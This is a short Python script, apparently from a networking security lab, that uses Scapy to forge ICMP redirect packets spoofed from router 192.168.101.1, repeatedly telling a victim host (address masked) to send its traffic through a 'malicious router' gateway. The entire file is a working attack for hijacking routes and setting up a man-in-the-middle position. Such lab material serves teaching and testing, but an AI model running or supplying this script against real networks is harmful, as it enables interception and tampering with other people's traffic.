from scapy.all import *
from time import sleep

#ip header from the router. The icmp payload tells the destination to redirect
#its packets
ip = IP(src='192.168.101.1', dst='@@@@@@@@@@')
icmp = ICMP(type=5, code=1)
icmp.gw = '@@@@@@@@@@@' #The ip address of the malicious router

#Original triggering packet
ip2 = IP(src='192.168.101.10', dst='172.17.0.1')

while True:
    send(ip/icmp/ip2/ICMP())
    sleep(5)


